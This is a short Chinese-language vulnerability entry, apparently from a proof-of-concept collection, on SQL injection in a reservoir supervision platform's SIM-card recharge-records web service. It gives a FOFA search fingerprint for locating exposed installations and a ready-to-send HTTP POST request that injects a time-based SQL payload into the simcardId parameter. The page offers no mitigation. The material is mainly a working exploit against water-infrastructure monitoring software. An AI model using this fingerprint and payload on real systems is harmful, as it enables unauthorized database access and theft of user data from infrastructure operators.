## 平升电子水库监管平台GetAllRechargeRecordsBySIMCardId接口处存在SQL注入漏洞

平升电子水库监管平台GetAllRechargeRecordsBySIMCardId接口处存在SQL注入漏洞，攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。

## fofa

```
"js/PSExtend.js"
```

## poc

```
POST /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept-Encoding: gzip, deflate

loginIdentifer=&simcardId=';WAITFOR DELAY '0:0:5'--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407050910230.png)